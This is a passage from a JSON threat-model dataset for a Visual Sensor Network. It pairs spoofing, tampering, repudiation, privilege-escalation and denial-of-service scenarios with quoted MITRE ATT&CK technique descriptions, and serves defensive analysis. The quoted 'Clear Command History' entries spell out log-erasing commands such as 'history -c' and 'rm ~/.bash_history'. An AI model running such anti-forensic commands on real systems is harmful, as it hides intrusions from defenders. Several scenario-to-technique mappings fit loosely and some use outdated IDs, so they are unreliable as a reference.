                    "Assumption": "The system does not limit resource consumption for users.",
                    "Role": "System Design",
                    "Condition": "Resource quotas and limits are not configured."
                },
                {
                    "Assumption": "No monitoring or alert mechanisms for resource usage.",
                    "Role": "System Administrator",
                    "Condition": "System lacks monitoring tools to detect unusual resource consumption."
                },
                {
                    "Assumption": "The attacker has access to the system to run resource-intensive tasks.",
                    "Role": "Attacker",
                    "Condition": "Access controls are insufficient to prevent misuse of resources."
                }
            ],
            "Potential Impact": "System unavailability, disrupted VSN operations",
            "MITRE ATT&CK Keywords": [
                "resource exhaust",
                "service disruption",
                "denial of service",
                "system resources"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could exploit a vulnerability to gain root access to the VSN nodes.",
            "Assumptions": [
                {
                    "Assumption": "The system has unpatched vulnerabilities that allow privilege escalation.",
                    "Role": "System Administrator",
                    "Condition": "Timely patch management is not in place."
                },
                {
                    "Assumption": "The attacker has the means to exploit the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "The attacker has tools or knowledge to exploit the vulnerability."
                },
                {
                    "Assumption": "Access control measures are insufficient to prevent unauthorized privilege escalation.",
                    "Role": "System Design",
                    "Condition": "The system lacks strong access control and monitoring mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized access to system controls, potential data tampering",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "root access",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A low-privileged user could exploit a configuration flaw to gain administrative rights.",
            "Assumptions": [
                {
                    "Assumption": "Configuration settings have flaws that allow privilege escalation.",
                    "Role": "System Administrator",
                    "Condition": "Configuration management is not properly enforced."
                },
                {
                    "Assumption": "The user has knowledge of these configuration flaws.",
                    "Role": "Attacker",
                    "Condition": "The attacker has access to or knowledge of system configurations."
                },
                {
                    "Assumption": "No logging or monitoring of configuration changes.",
                    "Role": "System Administrator",
                    "Condition": "The system lacks monitoring for unusual configuration changes."
                }
            ],
            "Potential Impact": "Unauthorized access to system controls, potential data tampering",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "configuration flaw",
                "administrative rights"
            ],
            "mitre_technique": {
                "name": "Services Registry Permissions Weakness",
                "description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service\u2019s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service\u2019s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)\n\nAdversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service\u2019s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.(Citation: malware_hides_service)",
                "id": "attack-pattern--17cc750b-e95b-4d7d-9dde-49e0de24148c",
                "technique_id": "T1574.011"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could exploit a default or weak password of the VSN nodes to gain higher privileges.",
            "Assumptions": [
                {
                    "Assumption": "Default or weak passwords are used on VSN nodes.",
                    "Role": "System Design",
                    "Condition": "Strong password policies are not enforced."
                },
                {
                    "Assumption": "The attacker has knowledge or tools to test these passwords.",
                    "Role": "Attacker",
                    "Condition": "The attacker can perform brute-force attacks on the system."
                },
                {
                    "Assumption": "There are no mechanisms to limit failed login attempts.",
                    "Role": "System Administrator",
                    "Condition": "Account lockout policies are not configured to prevent brute-force attacks."
                }
            ],
            "Potential Impact": "Unauthorized access to system controls, potential data tampering",
            "MITRE ATT&CK Keywords": [
                "password cracking",
                "default credentials",
                "privilege escalation",
                "weak password"
            ],
            "mitre_technique": {
                "name": "Password Cracking",
                "description": "Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) can be used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) is not an option. Further,  adversaries may leverage [Data from Configuration Repository](https://attack.mitre.org/techniques/T1602) in order to obtain hashed credentials for network devices.(Citation: US-CERT-TA18-106A) \n\nTechniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network.(Citation: Wikipedia Password cracking) The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.",
                "id": "attack-pattern--1d24cdee-9ea2-4189-b08e-af110bf2435d",
                "technique_id": "T1110.002"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "18",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses fake credentials to gain access to the Visual Sensor Network (VSN) and manipulate visual data.",
            "Assumptions": [
                {
                    "Assumption": "The system does not enforce strong authentication mechanisms.",
                    "Role": "Attacker",
                    "Condition": "Valid if authentication is weak or nonexistent."
                },
                {
                    "Assumption": "Attacker has access to the network",
                    "Role": "Attacker",
                    "Condition": "Valid if network can be accessed externally."
                },
                {
                    "Assumption": "Attacker can spoof identity without being detected.",
                    "Role": "Attacker",
                    "Condition": "Valid if system lacks identity verification mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized access and data manipulation.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Identity Theft",
                "Device",
                "Network"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Malware leverages stolen credentials from a legitimate user to access camera nodes within the VSN.",
            "Assumptions": [
                {
                    "Assumption": "Credentials are stored or transmitted insecurely.",
                    "Role": "Attacker",
                    "Condition": "Valid if there's poor credential management."
                },
                {
                    "Assumption": "Insufficient monitoring of login attempts.",
                    "Role": "System Admin",
                    "Condition": "Valid if login attempts are not monitored."
                },
                {
                    "Assumption": "Malicious actors can intercept communication.",
                    "Role": "Attacker",
                    "Condition": "Valid if traffic interception is possible."
                }
            ],
            "Potential Impact": "Unauthorized access and data exfiltration.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Credential Access",
                "Malware",
                "Network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker sets up a rogue device masquerading as a legitimate camera node in the VSN.",
            "Assumptions": [
                {
                    "Assumption": "Network does not authenticate new devices rigorously.",
                    "Role": "System Admin",
                    "Condition": "Valid if new devices are not verified."
                },
                {
                    "Assumption": "Attacker has physical access to the VSN deployment area.",
                    "Role": "Attacker",
                    "Condition": "Valid if physical security is weak."
                },
                {
                    "Assumption": "No device integrity checks are in place.",
                    "Role": "System Admin",
                    "Condition": "Valid if devices are not periodically verified."
                }
            ],
            "Potential Impact": "Data interception and manipulation.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Rogue Device",
                "Network",
                "Device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the firmware of a camera node to manipulate the visual data being recorded and transmitted.",
            "Assumptions": [
                {
                    "Assumption": "Firmware updates are not securely signed.",
                    "Role": "System Admin",
                    "Condition": "Valid if firmware can be tampered with."
                },
                {
                    "Assumption": "Attacker has access to the update mechanism.",
                    "Role": "Attacker",
                    "Condition": "Valid if update mechanism is accessible."
                },
                {
                    "Assumption": "No integrity checks on transmitted data.",
                    "Role": "System Admin",
                    "Condition": "Valid if data integrity is not verified."
                }
            ],
            "Potential Impact": "Compromised data integrity and reliability.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Firmware",
                "Device",
                "Injection"
            ],
            "mitre_technique": {
                "name": "System Firmware",
                "description": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation: About UEFI)\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
                "id": "attack-pattern--16ab6452-c3c1-497c-a47d-206018ca1ada",
                "technique_id": "T1542.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An insider with admin privileges modifies the logs to hide malicious activities within the VSN.",
            "Assumptions": [
                {
                    "Assumption": "Admins have unrestricted access to logs.",
                    "Role": "System Admin",
                    "Condition": "Valid if there are no access controls on logs."
                },
                {
                    "Assumption": "No monitoring for log changes.",
                    "Role": "System Admin",
                    "Condition": "Valid if log modifications are not tracked."
                },
                {
                    "Assumption": "Alerts are not configured for suspicious activities.",
                    "Role": "System Admin",
                    "Condition": "Valid if there's no alert system."
                }
            ],
            "Potential Impact": "Compromised data integrity and traceability.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Insider Threat",
                "Logs",
                "Data Manipulation"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Remote attacker exploits a vulnerability in the Linux-based VSN to execute arbitrary commands.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerabilities in the Linux OS are unpatched.",
                    "Role": "System Admin",
                    "Condition": "Valid if system is not updated regularly."
                },
                {
                    "Assumption": "Attacker has knowledge of a specific vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Valid if exploits are publicly known."
                },
                {
                    "Assumption": "System lacks intrusion detection.",
                    "Role": "System Admin",
                    "Condition": "Valid if there's no IDS/IPS in place."
                }
            ],
            "Potential Impact": "Compromised data integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Remote Code Execution",
                "Vulnerability",
                "Linux"
            ],
            "mitre_technique": {
                "name": "Malicious Shell Modification",
                "description": "Adversaries may establish persistence through executing malicious commands triggered by a user\u2019s shell. User shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command line interface or remotely logs in (such as SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user\u2019s home directory (~/) to configure the environment. All login shells on a system use <code>/etc/profile</code> when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user\u2019s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \n\nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files (Citation: intezer-kaiji-malware). These files require root permissions and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> (Rocke) which are sourced when a user opens a command line interface or connects remotely. Adversaries often use ~/.bash_profile since the system only executes the first file that exists in the listed order. Adversaries have also leveraged the <code>~/.bashrc</code> file (Tsunami, Rocke, Linux Rabbit, Magento) which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command line interface. Some malware targets the termination of a program to trigger execution (Cannon), adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session(Pearl_shellbot). \n\nFor macOS, the functionality of this technique is similar but leverages zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>. The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc<code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.",
                "id": "attack-pattern--01df3350-ce05-4bdf-bdf8-0a919a66d4a8",
                "technique_id": "T1156"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An employee denies involvement in modifying visual data from the VSN by claiming their account was compromised.",
            "Assumptions": [
                {
                    "Assumption": "Logs do not include sufficient details.",
                    "Role": "System Admin",
                    "Condition": "Valid if logs are minimal."
                },
                {
                    "Assumption": "No multifactor authentication implemented.",
                    "Role": "System Admin",
                    "Condition": "Valid if single-factor authentication is used."
                },
                {
                    "Assumption": "Access controls are weak.",
                    "Role": "System Admin",
                    "Condition": "Valid if access is improperly managed."
                }
            ],
            "Potential Impact": "Compromised data integrity and trust.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Insider Threat",
                "Logs",
                "Access Control"
            ],
            "mitre_technique": {
                "name": "Rogue Domain Controller",
                "description": "Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.\n\nRegistering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)\n\nThis technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)",
                "id": "attack-pattern--564998d8-ab3e-4123-93fb-eccaa6b9714a",
                "technique_id": "T1207"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user disputes a command sent to a camera node, claiming the command was never issued.",
            "Assumptions": [
                {
                    "Assumption": "Command history is not properly recorded.",
                    "Role": "System Admin",
                    "Condition": "Valid if command logs are insufficient."
                },
                {
                    "Assumption": "No non-repudiation mechanisms in place.",
                    "Role": "System Admin",
                    "Condition": "Valid if commands are not signed."
                },
                {
                    "Assumption": "System logs are easily tampered with.",
                    "Role": "System Admin",
                    "Condition": "Valid if log integrity checks are absent."
                }
            ],
            "Potential Impact": "Compromised trust in system operations and command integrity.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Command Injection",
                "Logs",
                "Non-repudiation"
            ],
            "mitre_technique": {
                "name": "Clear Command History",
                "description": "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A)\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)",
                "id": "attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a",
                "technique_id": "T1070.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker uses an anonymous account to perform malicious activities on the VSN, leaving no traceable information.",
            "Assumptions": [
                {
                    "Assumption": "Anonymous accounts have extended privileges.",
                    "Role": "System Admin",
                    "Condition": "Valid if anonymous accounts are not restricted."
                },
                {
                    "Assumption": "Logging for anonymous activities is inadequate.",
                    "Role": "System Admin",
                    "Condition": "Valid if actions are not thoroughly logged."
                },
                {
                    "Assumption": "System does not enforce accountability.",
                    "Role": "System Admin",
                    "Condition": "Valid if audit trails are lacking."
                }
            ],
            "Potential Impact": "Compromised system integrity and accountability.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Anonymous Access",
                "Logs",
                "Accountability"
            ],
            "mitre_technique": {
                "name": "Clear Command History",
                "description": "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A)\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)",
                "id": "attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a",
                "technique_id": "T1070.003"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted data being transmitted between camera nodes and the central server.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted without encryption.",
                    "Role": "System Admin",
                    "Condition": "Valid if data streams are not secure."
                },
                {
                    "Assumption": "Attacker has access to the network.",
                    "Role": "Attacker",
                    "Condition": "Valid if network access is possible."
                },
                {
                    "Assumption": "System lacks network monitoring.",
                    "Role": "System Admin",
                    "Condition": "Valid if intrusion detection is weak."
                }
            ],
            "Potential Impact": "Compromised confidentiality of visual data.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Data Interception",
                "Network",
                "Encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
